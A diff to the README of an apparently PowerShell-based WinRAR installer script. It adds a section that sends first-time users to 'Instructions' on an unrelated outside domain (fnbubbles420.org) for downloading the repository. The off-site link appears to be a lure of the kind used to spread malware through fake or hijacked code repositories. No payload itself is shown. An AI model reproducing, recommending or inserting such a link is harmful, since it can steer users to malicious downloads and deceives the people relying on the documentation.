@@ -2,6 +2,10 @@
 
 This PowerShell script automates the process of downloading, installing, and adding WinRAR to the system PATH on Windows machines.
 
+## how to download the repo first time users
+
+  - click link to read [**Instructions**](https://www.fnbubbles420.org/Instructions-On-How-To-Download-Repo)
+
 ## Features
 
 - **Automated Download**: Downloads the WinRAR installer directly from the official website.
